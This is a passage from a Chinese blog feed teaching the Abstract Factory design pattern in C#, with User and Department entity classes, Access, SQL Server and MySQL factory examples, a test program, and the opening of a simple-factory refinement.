string">"商场管理软件"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span><span class="token string">"商场管理软件."</span> <span class="token operator">+</span> dr<span class="token punctuation">[</span><span class="token string">"class"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">false</span><span class="token punctuation">,</span> BindingFlags<span class="token punctuation">.</span>Default<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> totalPrices <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            totalPrices <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">GetResult</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtPrice<span class="token punctuation">.</span>Text<span class="token punctuation">)</span> <span class="token operator">*</span> Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtNum<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            total <span class="token operator">=</span> total <span class="token operator">+</span> totalPrices<span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"单价："</span> <span class="token operator">+</span> txtPrice<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" 数量："</span> <span class="token operator">+</span> txtNum<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" "</span><span class="token operator">+</span>cbxType<span class="token punctuation">.</span>SelectedItem<span class="token operator">+</span> <span class="token string">" 合计："</span> <span class="token operator">+</span> totalPrices<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnClear_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            total <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            txtPrice<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>            txtNum<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 策略模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抽象工厂模式</title>
      <link href="/2020/08/22/chou-xiang-gong-han-mo-shi/"/>
      <url>/2020/08/22/chou-xiang-gong-han-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="定义理解"><a href="#定义理解" class="headerlink" title="定义理解"></a>定义理解</h1><p>​        抽象工厂模式（Abstract Factory Pattern）属于<strong>类的创建型模式</strong>，是对工厂方法模式的升级。提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类。</p><p>​        工厂方法模式是为了克服简单工厂模式随着产品类的增加需要增加额外的代码的缺点而诞生的，而抽象工厂针对工厂方法只能针对一个产品等级结构而扩展延伸的。</p><h1 id="角色与职责"><a href="#角色与职责" class="headerlink" title="角色与职责"></a>角色与职责</h1><ul><li><p>抽象产品(AbstractProduct)：</p><p>定义部分具体产品的轮廓，在创建具体产品时使用多态性实现对具体产品的动态声明。</p></li><li><p>具体产品(ConcreteProduct)：</p><p>抽象产品的具体实现，可扩展但在该模式下扩展无效。</p></li><li><p>抽象工厂接口(AbstractFactory)</p><p>定义部分工厂的轮廓，在运行中实现对工厂的动态创建。</p></li><li><p>具体工厂接口(ConcreteFactory)：</p><p>创建某个具体产品的实例，但以抽象产品引用返回实例。</p></li></ul><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ul><li>创建抽象产品类/接口（定义产品的特性、动作等）</li><li>创建具体产品类（继承自抽象产品，并实现抽象产品中定义的方法）</li><li>创建抽象工厂类/接口（定义工厂的特性、动作等）</li><li>创建具体工厂类（继承自抽象工厂，并实现抽象工厂中定义的方法）</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/抽象工厂模式/经典抽象工厂.png" alt="经典抽象工厂"></center><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p><strong>抽象工厂模式</strong>：</p><p>​        屏蔽掉具体类的创建方法。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/抽象工厂模式/用抽象工厂模式的数据库访问程序.jpg" alt="用抽象工厂模式的数据库访问程序"></center><p><strong>实体类</strong>：</p><p>User:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">User</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Name        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _name<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _name <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Department:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Department</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _deptName<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> DeptName        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _deptName<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _deptName <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>抽象产品</strong>：</p><p>IUser:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">interface</span> <span class="token class-name">IUser</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span><span class="token punctuation">;</span>        User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>IDepartment:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">interface</span> <span class="token class-name">IDepartment</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span><span class="token punctuation">;</span>        Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>具体产品</strong>：</p><p>AccessUser：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">AccessUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>SqlserverUser:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">SqlserverUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>AccessDepartment:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">AccessDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>SqlserverDepartment:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">SqlserverDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>抽象工厂</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">interface</span> <span class="token class-name">IFactory</span>    <span class="token punctuation">{</span>        IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>具体工厂</strong>：</p><p>AccessFactory:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">AccessFactory</span> <span class="token punctuation">:</span> IFactory    <span class="token punctuation">{</span>        <span class="token keyword">public</span> IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">AccessUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">AccessDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>SqlServerFactory:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">SqlServerFactory</span> <span class="token punctuation">:</span> IFactory    <span class="token punctuation">{</span>        <span class="token keyword">public</span> IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SqlserverUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SqlserverDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// 测试类</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// User实体</span>            User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Department实体</span>            Department dept <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Department</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 实例化一个具体工厂的抽象父工厂的对象</span>            IFactory factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AccessFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 实例化一个具体类的抽象父类对象</span>            IUser iu <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 具体商品对象的操作</span>            iu<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 抽象父工厂重新赋值</span>            factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlServerFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            IDepartment id <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>dept<span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>结果展示</strong>:</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/抽象工厂模式/经典抽象工厂测试.png" alt="经典抽象工厂测试"></center><p><strong>业务扩展</strong>：</p><p>将程序使用数据库全部换成Mysql数据库。</p><p><strong>具体产品</strong>：</p><p>添加MysqlUser类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">MysqlUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Mysql中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Mysql中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>添加MysqlDepartment类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">MysqlDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Mysql中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Mysql中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>具体工厂</strong>：</p><p>添加MysqlFactory类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">MysqlFactory</span> <span class="token punctuation">:</span> IFactory    <span class="token punctuation">{</span>        <span class="token keyword">public</span> IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MysqlUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MysqlDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>修改测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// 测试类</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// User实体</span>            User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Department实体</span>            Department dept <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Department</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 实例化一个具体工厂的抽象父工厂的对象</span>            <span class="token comment" spellcheck="true">//IFactory factory = new AccessFactory();</span>            IFactory factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MysqlFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 实例化一个具体类的抽象父类对象</span>            IUser iu <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 具体商品对象的操作</span>            iu<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>测试结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/抽象工厂模式/抽象工厂-业务扩展测试.png" alt="抽象工厂-业务扩展测试"></center><p><strong>注</strong>：</p><ul><li>进行业务扩展时，需要添加新的具体产品和具体工厂</li><li>具体产品和具体工厂必须实现抽象产品和抽象工厂</li></ul><h1 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h1><p>优点：</p><ul><li>客户端与具体类解耦；</li><li>添加具体类更加方便</li></ul><p>缺点：</p><ul><li>增加代码量和负责程度</li></ul><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>​        通过定义可以了解到，抽象工厂模式就为解决具有相同（或者相似）等级结构的多个产品族中的产品对象的创建问题。所以抽象工厂模式一般用于具有产品树和产品族的场景下。</p><h1 id="进一步改进"><a href="#进一步改进" class="headerlink" title="进一步改进"></a>进一步改进</h1><p>​        虽然抽象工厂模式将<strong>开放-封闭原则</strong>，<strong>依赖倒置原则</strong>发挥到极致，使得在<strong>切换接口</strong>的情况下非常方便，但是当系统中需要<strong>增加功能</strong>时，因功能分散导致需要添加多个新类才能实现。</p><p>比如：在上面的代码实例中添加项目表<strong>Project</strong>，至少要增加<strong>IProject、SqlServerProject、AccessProject</strong>，还需要更改<strong>IFactory、SqlServerFactory、AccessFactory</strong>才能完全实现。</p><h2 id="用简单工厂来改进抽象工厂"><a href="#用简单工厂来改进抽象工厂" class="headerlink" title="用简单工厂来改进抽象工厂"></a>用简单工厂来改进抽象工厂</h2><p>​        去除IFactory、SqlServerFactory和AccessFactory三个工厂类，取而代之的是DataAccess类，用一个简单工厂模式来实现。</p><p><strong>代码结构图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/抽象工厂模式/用简单工厂来改进抽象工厂程序.jpg" alt="用简单工厂来改进抽象工厂程序"></center><p><strong>实体类</strong>：</p><p><strong>User类</strong>:</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">User</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Name        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _name<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _name <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>Department类</strong>:</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Department</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token 